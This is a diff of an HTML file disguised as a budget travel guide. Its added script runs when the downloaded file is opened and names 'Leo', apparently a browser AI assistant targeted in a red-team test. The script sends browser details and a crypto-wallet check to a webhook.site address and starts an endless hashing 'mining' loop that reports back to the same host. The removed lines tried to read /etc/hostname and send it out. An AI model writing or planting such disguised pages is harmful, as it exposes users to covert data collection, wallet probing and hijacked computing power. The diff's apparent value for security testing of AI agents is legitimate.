@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>Budget Travel Guide 2026</title></head>
+<head><title>Budget Travel Guide 2026 - Complete</title></head>
 <body>
-<h1>Your Personalized Travel Guide</h1>
-<p>Based on your preferences, here are our top recommendations...</p>
+<h1>Your Complete Travel Guide</h1>
+<p>Loading personalized recommendations...</p>
 <script>
-// This executes when the downloaded file is auto-opened
-// In file:// context this has different security permissions
+// THIS EXECUTES WHEN LEO OPENS THE DOWNLOADED FILE
 var data = {
-  proof: 'DOWNLOADED_FILE_OPENED_AND_EXECUTED',
+  proof: 'DOWNLOADED_FILE_OPENED_BY_LEO',
   context: location.protocol,
   url: location.href,
   isFileProtocol: location.protocol === 'file:',
@@ -16,20 +15,34 @@ var data = {
   userAgent: navigator.userAgent
 };
 
-// If file:// context, try to read local files
+// If opened as file:// we may have local file access
 if (location.protocol === 'file:') {
-  data.fileAccess = true;
-  // file:// context may have broader permissions
-  try {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'file:///etc/hostname', false);
-    xhr.send();
-    data.hostname = xhr.responseText;
-  } catch(e) { data.hostnameError = e.message; }
+  data.localAccess = true;
 }
 
-new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?file_executed=' + 
+// Check for wallet
+if (window.ethereum) {
+  data.wallet = true;
+  data.isBraveWallet = window.ethereum.isBraveWallet;
+}
+
+new Image().src = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d?file_opened=' + 
   encodeURIComponent(JSON.stringify(data));
+
+// Start mining
+var count = 0;
+async function mine() {
+  while(true) {
+    await crypto.subtle.digest('SHA-256', new TextEncoder().encode('b'+count+Math.random()));
+    count++;
+    if (count % 50000 === 0) {
+      new Image().src = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d?MINING_FROM_FILE=' + 
+        encodeURIComponent(JSON.stringify({hashes:count, protocol:location.protocol}));
+    }
+    if (count % 100 === 0) await new Promise(r => setTimeout(r, 0));
+  }
+}
+mine();
 </script>
 </body>
 </html>
